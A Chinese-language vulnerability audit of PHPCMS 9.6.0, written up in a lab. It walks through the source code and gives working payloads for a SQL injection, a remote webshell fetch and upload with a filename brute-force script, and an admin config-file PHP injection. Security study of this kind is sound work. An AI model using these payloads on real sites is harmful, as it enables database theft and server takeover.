[参考链接 PHPcms 9.6.0漏洞审计](https://github.com/SukaraLin/php_code_audit_project/blob/master/phpcms/PHPcms%209.6.0%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1.md)

## cms组成

`index.php`作为整个cms的入口(包括后台)

```php
<?php
/**
 *  index.php PHPCMS 入口
 *
 * @copyright			(C) 2005-2010 PHPCMS
 * @license				http://www.phpcms.cn/license/
 * @lastmodify			2010-6-1
 */
 //PHPCMS根目录

define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR);

include PHPCMS_PATH.'/phpcms/base.php';

pc_base::creat_app();

?>
```

首先对`phpcms/base.php`进行包含,`base.php`是PHPCMS框架入口文件

1. 定义了大量的常量,例如PHPCMS框架路径

2. 加载公用函数库

```php
pc_base::load_sys_func('global');//phpcms/libs/functions/global.func.php
pc_base::load_sys_func('extention');
pc_base::auto_load_func();
```

加载了对字符串或数组进行处理的函数如`addslashes`,`safe_replace`('>'替换从'&gt'),`remove_xss`(xss过滤)

3. 提供了pc_base类对应用进行初始化(主要使用静态方法实现)

`pc_base::creat_app();`

```php
public static function creat_app()
{
    return self::load_sys_class('application');
}
/**
 * 加载系统类方法
 * @param string $classname 类名
 * @param string $path 扩展地址
 * @param intger $initialize 是否初始化
 */
public static function load_sys_class($classname, $path = '', $initialize = 1)
{
    return self::_load_class($classname, $path, $initialize);
}

/**
 * 加载类文件函数
 * @param string $classname 类名
 * @param string $path 扩展地址
 * @param intger $initialize 是否初始化
 */
private static function _load_class($classname, $path = '', $initialize = 1)
{
    static $classes = array();
    if (empty($path)) $path = 'libs' . DIRECTORY_SEPARATOR . 'classes';

    $key = md5($path . $classname);
    if (isset($classes[$key])) {
        if (!empty($classes[$key])) {
            return $classes[$key];
        } else {
            return true;
        }
    }
    if (file_exists(PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php')) {
        include PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php';
        $name = $classname;
        if ($my_path = self::my_path(PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php')) {
            include $my_path;
            $name = 'MY_' . $classname;
        }
        if ($initialize) {
            $classes[$key] = new $name;
        } else {
            $classes[$key] = true;
        }
        return $classes[$key];
    } else {
        return false;
    }
}
```

对`phpcms/libs/classes/application.class.php`进行包含并且通过`$classes[$key] = new $name;`对`application`类进行实例化

`application`实例化时会调用构造函数`__construct`

```php
public function __construct()
{
    $param = pc_base::load_sys_class('param');
    define('ROUTE_M', $param->route_m());
    define('ROUTE_C', $param->route_c());
    define('ROUTE_A', $param->route_a());
    $this->init();
}
private function init()
{
    $controller = $this->load_controller();
    if (method_exists($controller, ROUTE_A)) {
        if (preg_match('/^[_]/i', ROUTE_A)) {
            exit('You are visiting the action is to protect the private action');
        } else {
            call_user_func(array($controller, ROUTE_A));
        }
    } else {
        exit('Action does not exist.');
    }
}
private function load_controller($filename = '', $m = '')
{
    if (empty($filename)) $filename = ROUTE_C;
    if (empty($m)) $m = ROUTE_M;
    $filepath = PC_PATH . 'modules' . DIRECTORY_SEPARATOR . $m . DIRECTORY_SEPARATOR . $filename . '.php';
    if (file_exists($filepath)) {
        $classname = $filename;
        include $filepath;
        if ($mypath = pc_base::my_path($filepath)) {
            $classname = 'MY_' . $filename;
            include $mypath;
        }
        if (class_exists($classname)) {
            return new $classname;
        } else {
            exit('Controller does not exist.');
        }
    } else {
        exit('Controller does not exist.');
    }
}
```

首先是对`param`类进行实例化,`param.class.php`是参数处理类,`param`类进行实例化时会调用构造函数`__construct`

```php
public function __construct()
{
    if (!get_magic_quotes_gpc()) {
        $_POST = new_addslashes($_POST);
        $_GET = new_addslashes($_GET);
        $_REQUEST = new_addslashes($_REQUEST);
        $_COOKIE = new_addslashes($_COOKIE);
    }

    $this->route_config = pc_base::load_config('route', SITE_URL) ? pc_base::load_config('route', SITE_URL) : pc_base::load_config('route', 'default');

    if (isset($this->route_config['data']['POST']) && is_array($this->route_config['data']['POST'])) {
        foreach ($this->route_config['data']['POST'] as $_key => $_value) {
            if (!isset($_POST[$_key])) $_POST[$_key] = $_value;
        }
    }
    if (isset($this->route_config['data']['GET']) && is_array($this->route_config['data']['GET'])) {
        foreach ($this->route_config['data']['GET'] as $_key => $_value) {
            if (!isset($_GET[$_key])) $_GET[$_key] = $_value;
        }
    }
    if (isset($_GET['page'])) {
        $_GET['page'] = max(intval($_GET['page']), 1);
        $_GET['page'] = min($_GET['page'], 1000000000);
    }
    return true;
}

/**
 * 加载配置文件
 * @param string $file 配置文件
 * @param string $key  要获取的配置荐
 * @param string $default  默认配置。当获取配置项目失败时该值发生作用。
 * @param boolean $reload 强制重新加载。
 */
public static function load_config($file, $key = '', $default = '', $reload = false)
{
    static $configs = array();
    if (!$reload && isset($configs[$file])) {
        if (empty($key)) {
            return $configs[$file];
        } elseif (isset($configs[$file][$key])) {
            return $configs[$file][$key];
        } else {
            return $default;
        }
    }
    $path = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . $file . '.php';
    if (file_exists($path)) {
        $configs[$file] = include $path;
    }
    if (empty($key)) {
        return $configs[$file];
    } elseif (isset($configs[$file][$key])) {
        return $configs[$file][$key];
    } else {
        return $default;
    }
}
```

1. 对`$_GET,$_POST,$_REQUEST,$_COOKIE`进行`addslashes`

2. 加载`caches/configs/route.php`,其为路由配置文件

```php
<?php
/**
 * 路由配置文件
 * 默认配置为default如下：
 * 'default'=>array(
 * 	'm'=>'phpcms', 
 * 	'c'=>'index', 
 * 	'a'=>'init', 
 * 	'data'=>array(
 * 		'POST'=>array(
 * 			'catid'=>1
 * 		),
 * 		'GET'=>array(
 * 			'contentid'=>1
 * 		)
 * 	)
 * )
 * 基中“m”为模型,“c”为控制器，“a”为事件，“data”为其他附加参数。
 * data为一个二维数组，可设置POST和GET的默认参数。POST和GET分别对应PHP中的$_POST和$_GET两个超全局变量。在程序中您可以使用$_POST['catid']来得到data下面POST中的数组的值。
 * data中的所设置的参数等级比较低。如果外部程序有提交相同的名字的变量，将会覆盖配置文件中所设置的值。如：
 * 外部程序POST了一个变量catid=2那么你在程序中使用$_POST取到的值是2，而不是配置文件中所设置的1。
 */
return array(
	'default'=>array('m'=>'content', 'c'=>'index', 'a'=>'init'),
);
```

路由方法解析

- m为模型即指向`phpcms/modules/$m`

- c为控制器即指向`phpcms/modules/$m/$c.php`,同时类名与文件名相同

- a为事件即指向`phpcms/modules/$m/$c.php`中的`$c`类中的`$a`函数

默认路由为`phpcms/modules/content/index.php`的`index`类的`init`函数

确认路由后,回到`application`类中,通过`load_controller`加载路由(include并实例化),然后通过`call_user_func`对事件函数进行调用

## phpcms/modules/content/down.php存在SQL注入漏洞

```php
class down
{
    private $db;
    function __construct()
    {
        $this->db = pc_base::load_model('content_model');
    }

    public function init()
    {
        $a_k = trim($_GET['a_k']);
        if (!isset($a_k)) showmessage(L('illegal_parameters'));
        $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system', 'auth_key'));
        if (empty($a_k)) showmessage(L('illegal_parameters'));
        unset($i, $m, $f);
        parse_str($a_k);
        if (isset($i)) $i = $id = intval($i);
        if (!isset($m)) showmessage(L('illegal_parameters'));
        if (!isset($modelid) || !isset($catid)) showmessage(L('illegal_parameters'));
        if (empty($f)) showmessage(L('url_invalid'));
        $allow_visitor = 1;
        $MODEL = getcache('model', 'commons');
        $tablename = $this->db->table_name = $this->db->db_tablepre . $MODEL[$modelid]['tablename'];
        $this->db->table_name = $tablename . '_data';
        $rs = $this->db->get_one(array('id' => $id));
        $siteids = getcache('category_content', 'commons');
        $siteid = $siteids[$catid];
        $CATEGORYS = getcache('category_content_' . $siteid, 'commons');
```

`$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system', 'auth_key'));`说明`$a_k`来源于某个字符串的解密结果,因此可以绕过`new_addslashes`

注意到`parse_str($a_k);`存在变量覆盖漏洞,利用该漏洞绕过`if (isset($i)) $i = $id = intval($i);`并且覆盖`$id`即可利用`$rs = $this->db->get_one(array('id' => $id));`进行sql注入

但是要想利用`sys_auth`解密字符串就必须先构造出一个能够正常解密且包含注入语句的字符串,有两种途径

1. 获取`pc_base::load_config('system', 'auth_key')`,`auth_key`是cms安装时随机生成的,获取难度较大

2. 像前面审计dedecms那样,将包含注入语句的字符串传递给cms再通过类似`GetCookie`的手段将其读取

```php
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0)
{
    $ckey_length = 4;
    $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    .../*盒变换*/

    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121842751.png)

全局查找`sys_auth`的引用,在`phpcms\phpcms\libs\classes\param.class.php`中看到调用了`setcookie`并将加密后的值代入cookie中

```php
public static function set_cookie($var, $value = '', $time = 0)
{
    $time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
    $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
    $var = pc_base::load_config('system', 'cookie_pre') . $var;
    $_COOKIE[$var] = $value;
    if (is_array($value)) {
        foreach ($value as $k => $v) {
            setcookie($var . '[' . $k . ']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system', 'cookie_path'), pc_base::load_config('system', 'cookie_domain'), $s);
        }
    } else {
        setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system', 'cookie_path'), pc_base::load_config('system', 'cookie_domain'), $s);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121846526.png)

全局查找`param::set_cookie`的引用,在`phpcms/modules/attachment/attachments.php`中的`swfupload_json`调用了`param::set_cookie`且`$json_str`为可控参数

```php
    function __construct()
    {
        pc_base::load_app_func('global');
        $this->upload_url = pc_base::load_config('system', 'upload_url');
        $this->upload_path = pc_base::load_config('system', 'upload_path');
        $this->imgext = array('jpg', 'gif', 'png', 'bmp', 'jpeg');
        $this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE'));
        $this->isadmin = $this->admin_username = $_SESSION['roleid'] ? 1 : 0;
        $this->groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
        //判断是否登录
        if (empty($this->userid)) {
            showmessage(L('please_login', '', 'member'));
        }
    }

    private function upload_json($aid, $src, $filename)
    {
        $arr['aid'] = intval($aid);
        $arr['src'] = trim($src);
        $arr['filename'] = urlencode($filename);
        $json_str = json_encode($arr);
        $att_arr_exist = param::get_cookie('att_json');
        $att_arr_exist_tmp = explode('||', $att_arr_exist);
        if (is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
            return true;
        } else {
            $json_str = $att_arr_exist ? $att_arr_exist . '||' . $json_str : $json_str;
            param::set_cookie('att_json', $json_str);
            return true;
        }
    }

    /**
     * 设置swfupload上传的json格式cookie
     */
    public function swfupload_json()
    {
        $arr['aid'] = intval($_GET['aid']);
        $arr['src'] = safe_replace(trim($_GET['src']));
        $arr['filename'] = urlencode(safe_replace($_GET['filename']));
        $json_str = json_encode($arr);
        $att_arr_exist = param::get_cookie('att_json');
        $att_arr_exist_tmp = explode('||', $att_arr_exist);
        if (is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
            return true;
        } else {
            $json_str = $att_arr_exist ? $att_arr_exist . '||' . $json_str : $json_str;
            param::set_cookie('att_json', $json_str);
            return true;
        }
    }
```

但是在`__construct`函数中要求当前处于已登录状态,但是其判断方式仅对`$this->userid`判断是否为空,而`$this->userid`来源于`$_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE'))`

当`$_SESSION['userid']`为空时,即可调用`param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE')`

当`_userid`的cookie为空时,即可将`$this->userid`设置为`sys_auth($_POST['userid_flash'], 'DECODE')`的结果,保证`$_POST['userid_flash']`是一个可以正常解密的字符串即可绕过登录检查,从而调用`swfupload_json`

在`phpcms/modules/mood/index.php`中的`post`函数中,构造参数即可调用`param::set_cookie('mood_id', $cookies.','.$mood_id);`从而获得一个可以正常解密的字符串

`http://192.168.241.130:8080/index.php?m=mood&c=index&a=post&id=123&k=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203121949535.png)

`Set-Cookie: gYvca_mood_id=e5a3qbTrR_cuRH_bUNu77w77DaTEdUSfzpOJXmUqs-7F`

注意到存在`safe_replace`,可以使用双写绕过`%\27`->`%27`

```php
function safe_replace($string)
{
    $string = str_replace('%20', '', $string);
    $string = str_replace('%27', '', $string);
    $string = str_replace('%2527', '', $string);
    $string = str_replace('*', '', $string);
    $string = str_replace('"', '&quot;', $string);
    $string = str_replace("'", '', $string);
    $string = str_replace('"', '', $string);
    $string = str_replace(';', '', $string);
    $string = str_replace('<', '&lt;', $string);
    $string = str_replace('>', '&gt;', $string);
    $string = str_replace("{", '', $string);
    $string = str_replace('}', '', $string);
    $string = str_replace('\\', '', $string);
    return $string;
}
```

```
POST /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=...%26id=gululingbo%\27+and+updatexml(1,concat(0x7e,(user()),0x7e),1)%23%26m=1%26modelid=1%26catid=123%26f=123%26... HTTP/1.1
Host: 192.168.241.130:8080
Content-Length: 57
Pragma: no-cache
Cache-Control: no-cache
Origin: http://192.168.241.130:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.241.130:8080/index.php?m=attachment&c=attachments&a=swfupload_json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=q129buklbv2pojhu3fkfm4j0r4; XDEBUG_SESSION=XDEBUG_ECLIPSE; gYvca_att_json=asdf
Connection: close

userid_flash=e5a3qbTrR_cuRH_bUNu77w77DaTEdUSfzpOJXmUqs-7F
```

`730a-gH-hHP4GIszpc6Gf5OdQ2s8t8gb7dvK75XVlVpRLZXZJRyIpwS75QKFKFQdZWHR2xplUIVF9GrDL1PwCV25pcjljgKgO2MqbU7EcZYCaoSckKOjCSZE2Dp7a6xNNaNwmqnE9cN9Z4MBrCKJWtuXzytoEJ91_TRSkxbznvcm8VTU2LcMFTqoKdNNsCS5yWFFUMvd7Y5CGqtV4PVoN9jJ`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046457.png)

```
GET /index.php?m=content&c=down&a=init&aid=1&a_k=730a-gH-hHP4GIszpc6Gf5OdQ2s8t8gb7dvK75XVlVpRLZXZJRyIpwS75QKFKFQdZWHR2xplUIVF9GrDL1PwCV25pcjljgKgO2MqbU7EcZYCaoSckKOjCSZE2Dp7a6xNNaNwmqnE9cN9Z4MBrCKJWtuXzytoEJ91_TRSkxbznvcm8VTU2LcMFTqoKdNNsCS5yWFFUMvd7Y5CGqtV4PVoN9jJ HTTP/1.1
Host: 192.168.241.130:8080
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=q129buklbv2pojhu3fkfm4j0r4; XDEBUG_SESSION=XDEBUG_ECLIPSE
Connection: close

```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203122046123.png)

## phpcms/modules/member/index.php存在任意文件上传漏洞

在`register`函数中有以下功能

```php
if ($member_setting['choosemodel']) {
    require_once CACHE_MODEL_PATH . 'member_input.class.php';
    require_once CACHE_MODEL_PATH . 'member_update.class.php';
    $member_input = new member_input($userinfo['modelid']);
    $_POST['info'] = array_map('new_html_special_chars', $_POST['info']);
    $user_model_info = $member_input->get($_POST['info']);
}
```

到达这一功能点需要构造数据

```
http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1

POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=123
```

这里首先对`member_update.class.php`和`member_input.class.php`进行包含,然后实例化了一个`member_input`类,然后调用了`member_input`类中的`get`方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131542231.png)

注意这里选择的是`caches`目录下的`member_input.class.php`

```php
function get($data)
{
    $this->data = $data = trim_script($data);
    $model_cache = getcache('member_model', 'commons');
    $this->db->table_name = $this->db_pre . $model_cache[$this->modelid]['tablename'];

    $info = array();
    $debar_filed = array('catid', 'title', 'style', 'thumb', 'status', 'islink', 'description');
    if (is_array($data)) {
        foreach ($data as $field => $value) {
            if ($data['islink'] == 1 && !in_array($field, $debar_filed)) continue;
            $field = safe_replace($field);
            $name = $this->fields[$field]['name'];
            $minlength = $this->fields[$field]['minlength'];
            $maxlength = $this->fields[$field]['maxlength'];
            $pattern = $this->fields[$field]['pattern'];
            $errortips = $this->fields[$field]['errortips'];
            if (empty($errortips)) $errortips = "$name 不符合要求！";
            $length = empty($value) ? 0 : strlen($value);
            if ($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
            if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在' . $field . '字段');
            if ($maxlength && $length > $maxlength && !$isimport) {
                showmessage("$name 不得超过 $maxlength 个字符！");
            } else {
                str_cut($value, $maxlength);
            }
            if ($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
            if ($this->fields[$field]['isunique'] && $this->db->get_one(array($field => $value), $field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
            $func = $this->fields[$field]['formtype'];
            if (method_exists($this, $func)) $value = $this->$func($field, $value);

            $info[$field] = $value;
        }
    }
    return $info;
}
```

注意到最后存在这样的语句`if (method_exists($this, $func)) $value = $this->$func($field, $value);`,说明可以通过get方法去调用这个类中的所有方法

而`$func`来源于`$this->fields[$field]['formtype']`,同时在`editor`方法中调用了`attachment::download`,可能可以将远程服务器上的文件下载到本地

```php
function editor($field, $value)
{
    $setting = string2array($this->fields[$field]['setting']);
    $enablesaveimage = $setting['enablesaveimage'];
    $site_setting = string2array($this->site_config['setting']);
    $watermark_enable = intval($site_setting['watermark_enable']);
    $value = $this->attachment->download('content', $value, $watermark_enable);
    return $value;
}
```

因此在这里构造的payload要满足以下几点

1. `$data`必须是`array`类型,因此`$_POST['info']`必须是`array`类型

2. `$this->fields[$field]['formtype']==editor`而在`caches/caches_model/caches_data/model_field_1.cache.php`,说明`$field`必须等于`content`

```php
 'content' => 
  array (
    'fieldid' => '8',
    'modelid' => '1',
    'siteid' => '1',
    'field' => 'content',
    'name' => '内容',
    ...
    'errortips' => '内容不能为空',
    'formtype' => 'editor',
    ...
)',
```

3. 注意存在`$field = safe_replace($field);`,可能需要对其进行绕过

```
http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1

POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=valuexxxx
```

`phpcms/libs/classes/attachment.class.php`

```php
/**
 * 附件下载
 * Enter description here ...
 * @param $field 预留字段
 * @param $value 传入下载内容
 * @param $watermark 是否加入水印
 * @param $ext 下载扩展名
 * @param $absurl 绝对路径
 * @param $basehref 
 */
function download($field, $value, $watermark = '0', $ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')
{
    global $image_d;
    $this->att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system', 'upload_url');
    $this->field = $field;
    $dir = date('Y/md/');
    $uploadpath = $upload_url . $dir;
    $uploaddir = $this->upload_root . $dir;
    $string = new_stripslashes($value);
    if (!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    foreach ($matches[3] as $matche) {
        if (strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
    }
    unset($matches, $string);
    $remotefileurls = array_unique($remotefileurls);
    $oldpath = $newpath = array();
    foreach ($remotefileurls as $k => $file) {
        if (strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
        $filename = fileext($file);
        $file_name = basename($file);
        $filename = $this->getname($filename);

        $newfile = $uploaddir . $filename;
        $upload_func = $this->upload_func;//$this->upload_func = 'copy';
        if ($upload_func($file, $newfile)) {
            $oldpath[] = $k;
            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath . $filename;
            @chmod($newfile, 0777);
            $fileext = fileext($filename);
            if ($watermark) {
                watermark($newfile, $newfile, $this->siteid);
            }
            $filepath = $dir . $filename;
            $downloadedfile = array('filename' => $filename, 'filepath' => $filepath, 'filesize' => filesize($newfile), 'fileext' => $fileext);
            $aid = $this->add($downloadedfile);
            $this->downloadedfiles[$aid] = $filepath;
        }
    }
    return str_replace($oldpath, $newpath, $value);
}
```

1. `preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)`而`$ext = 'gif|jpg|jpeg|bmp|png'`,正则匹配检查并提取结果

2. `$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);`

```php
/**
 * 补全网址
 *
 * @param	string	$surl		源地址
 * @param	string	$absurl		相对地址
 * @param	string	$basehref	网址
 * @return	string	网址
 */
function fillurl($surl, $absurl, $basehref = '')
{
    if ($basehref != '') {
        $preurl = strtolower(substr($surl, 0, 6));
        if ($preurl == 'http://' || $preurl == 'ftp://' || $preurl == 'mms://' || $preurl == 'rtsp://' || $preurl == 'thunde' || $preurl == 'emule://' || $preurl == 'ed2k://')
            return  $surl;
        else
            return $basehref . '/' . $surl;
    }
    $i = 0;
    $dstr = '';
    $pstr = '';
    $okurl = '';
    $pathStep = 0;
    $surl = trim($surl);
    if ($surl == '') return '';
    $urls = @parse_url(SITE_URL);
    $HomeUrl = $urls['host'];
    $BaseUrlPath = $HomeUrl . $urls['path'];
    $BaseUrlPath = preg_replace("/\/([^\/]*)\.(.*)$/", '/', $BaseUrlPath);
    $BaseUrlPath = preg_replace("/\/$/", '', $BaseUrlPath);
    $pos = strpos($surl, '#');
    if ($pos > 0) $surl = substr($surl, 0, $pos);
    if ($surl[0] == '/') {
        $okurl = 'http://' . $HomeUrl . '/' . $surl;
    } elseif ($surl[0] == '.') {
        if (strlen($surl) <= 2) return '';
        elseif ($surl[0] == '/') {
            $okurl = 'http://' . $BaseUrlPath . '/' . substr($surl, 2, strlen($surl) - 2);
        } else {
            $urls = explode('/', $surl);
            foreach ($urls as $u) {
                if ($u == "..") $pathStep++;
                else if ($i < count($urls) - 1) $dstr .= $urls[$i] . '/';
                else $dstr .= $urls[$i];
                $i++;
            }
            $urls = explode('/', $BaseUrlPath);
            if (count($urls) <= $pathStep)
                return '';
            else {
                $pstr = 'http://';
                for ($i = 0; $i < count($urls) - $pathStep; $i++) {
                    $pstr .= $urls[$i] . '/';
                }
                $okurl = $pstr . $dstr;
            }
        }
    } else {
        $preurl = strtolower(substr($surl, 0, 6));
        if (strlen($surl) < 7)
            $okurl = 'http://' . $BaseUrlPath . '/' . $surl;
        elseif ($preurl == "http:/" || $preurl == 'ftp://' || $preurl == 'mms://' || $preurl == "rtsp://" || $preurl == 'thunde' || $preurl == 'emule:' || $preurl == 'ed2k:/')
            $okurl = $surl;
        else
            $okurl = 'http://' . $BaseUrlPath . '/' . $surl;
    }
    $preurl = strtolower(substr($okurl, 0, 6));
    if ($preurl == 'ftp://' || $preurl == 'mms://' || $preurl == 'rtsp://' || $preurl == 'thunde' || $preurl == 'emule:' || $preurl == 'ed2k:/') {
        return $okurl;
    } else {
        $okurl = preg_replace('/^(http:\/\/)/i', '', $okurl);
        $okurl = preg_replace('/\/{1,}/i', '/', $okurl);
        return 'http://' . $okurl;
    }
}
```

注意到在`fillurl`存在`$pos = strpos($surl, '#');    if ($pos > 0) $surl = substr($surl, 0, $pos);`用于获取网页锚点前的路径,因此可以利用网页锚点绕过前面正则匹配

`xxx#a.jpg`

```php
<?php
$ext = 'gif|jpg|jpeg|bmp|png';

$string="src=http://a.com/a.php#a.jpg";

preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches);

var_dump($matches);
```

```php
array(5) {
  [0]=>
  array(1) {
    [0]=>
    string(28) "src=http://a.com/a.php#a.jpg"
  }
  [1]=>
  array(1) {
    [0]=>
    string(3) "src"
  }
  [2]=>
  array(1) {
    [0]=>
    string(0) ""
  }
  [3]=>
  array(1) {
    [0]=>
    string(24) "http://a.com/a.php#a.jpg"
  }
  [4]=>
  array(1) {
    [0]=>
    string(3) "jpg"
  }
}
```

最后利用`$upload_func($file, $newfile)`调用了`copy`从远程端拷贝文件到本地,因此成功在本地保留webshell

```
http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1

POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=src=http://a.com/a.php#a.jpg
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131729565.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131730051.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731608.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131731573.png)

本地测试payload

```
http://192.168.241.130:8080/index.php?m=member&c=index&a=register&siteid=1

POST: dosubmit=1&username=123&nickname=123&email=a@a.com&password=123456&modelid=1&info[content]=src=http://192.168.241.1:8000/a.php#a.jpg
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131734088.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131735901.png)

但由于`rand(100,999)`的存在,需要编写脚本去爆破才能得到具体的文件名

```python
import requests
import time

url='http://192.168.241.130:8080/uploadfile/2022/0313/202203130533%s'

for i in range(49000,50000):
    r=requests.get(url=url%(str(i)+'.php'))
    if r.status_code==200:
        print(i)
        break
    if i%100==0:
        time.sleep(5)
```

## phpsso_server/phpcms/modules/admin/system.php后台getshell

```php
public function uc()
{
    if (isset($_POST['dosubmit'])) {
        $data = isset($_POST['data']) ? $_POST['data'] : '';
        $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0;
        $filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'system.php';
        $config = include $filepath;
        $uc_config = '<?php ' . "\ndefine('UC_CONNECT', 'mysql');\n";
        foreach ($data as $k => $v) {
            $old[] = "'$k'=>'" . (isset($config[$k]) ? $config[$k] : $v) . "',";
            $new[] = "'$k'=>'$v',";
            $uc_config .= "define('" . strtoupper($k) . "', '$v');\n";
        }
        $html = file_get_contents($filepath);
        $html = str_replace($old, $new, $html);
        $uc_config_filepath = CACHE_PATH . 'configs' . DIRECTORY_SEPARATOR . 'uc_config.php';
        @file_put_contents($uc_config_filepath, $uc_config);
        @file_put_contents($filepath, $html);
        $this->db->insert(array('name' => 'ucenter', 'data' => array2string($data)), 1, 1);
        showmessage(L('operation_success'), HTTP_REFERER);
    }
    $data = array();
    $r = $this->db->get_one(array('name' => 'ucenter'));
    if ($r) {
        $data = string2array($r['data']);
    }
    include $this->admin_tpl('system_uc');
}
```

```
http://192.168.241.130:8080/phpsso_server/index.php?m=admin&c=system&a=uc

POST: dosubmit=1&data[asdf','qwer');?><?php phpinfo();?>asdf]=asdf
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203131926371.png)